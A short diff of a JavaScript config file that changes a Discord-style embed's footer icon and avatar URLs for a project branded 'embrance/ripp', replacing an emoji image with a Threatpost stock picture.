@@ -26,10 +26,10 @@ var config = {
         username: "embrance/ripp",
         footer: {
             text: `embrance/ripp`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            icon_url: "https://media.threatpost.com/wp-content/uploads/sites/103/2018/05/31165323/Break_In-e1527800022580.jpg",
         },
         href: "embrance/ripp",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        avatar_url: "https://media.threatpost.com/wp-content/uploads/sites/103/2018/05/31165323/Break_In-e1527800022580.jpg"
     },
 
     badges: {
